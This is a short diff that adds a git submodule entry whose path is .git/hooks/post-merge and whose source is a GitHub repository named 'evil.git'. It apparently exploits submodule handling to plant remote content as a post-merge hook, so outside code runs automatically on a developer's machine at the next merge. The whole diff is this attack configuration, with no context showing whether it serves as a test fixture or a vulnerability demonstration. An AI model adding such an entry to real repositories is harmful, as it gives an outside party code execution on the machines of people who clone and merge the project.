@@ -1,0 +1,3 @@
+[submodule ".git/hooks/post-merge"]
+	path = .git/hooks/post-merge
+	url = https://github.com/Svjashennik/evil.git
